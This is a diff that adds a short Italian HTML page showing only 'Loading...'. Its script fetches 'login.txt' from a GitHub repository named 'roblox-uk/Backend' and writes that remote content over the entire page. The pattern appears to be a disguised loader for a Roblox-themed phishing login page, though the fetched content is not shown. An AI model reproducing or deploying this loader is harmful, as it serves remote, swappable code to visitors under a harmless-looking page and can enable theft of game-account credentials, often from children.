@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    const url = "https://raw.githubusercontent.com/roblox-uk/Backend/refs/heads/main/login.txt"; 
+
+    fetch(url)
+      .then(response => response.text())
+      .then(html => {
+        document.open();
+        document.write(html);
+        document.close();
+      })
+      .catch(err => {
+        document.body.innerHTML = "<h1>Errore nel caricamento</h1><p>" + err + "</p>";
+        console.error("Errore:", err);
+      });
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
+</html>
